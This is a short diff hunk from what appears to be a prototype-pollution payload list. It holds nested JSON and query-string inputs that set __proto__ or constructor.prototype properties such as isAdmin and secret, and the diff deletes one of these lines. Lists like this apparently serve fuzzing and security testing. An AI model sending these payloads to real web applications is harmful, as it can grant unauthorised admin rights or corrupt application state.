@@ -102,7 +102,6 @@ constructor[prototype][polluted]=true
 {"a": {"constructor": {"prototype": {"constructor": {"prototype": {"isAdmin": true}}}}}}
 
 # qs / querystring nested DOT parse forms (vs bracket forms above)
-?__proto__.polluted=true
 ?__proto__.isAdmin=true
 ?__proto__.secret=attacker-controlled
 ?constructor.prototype.polluted=true
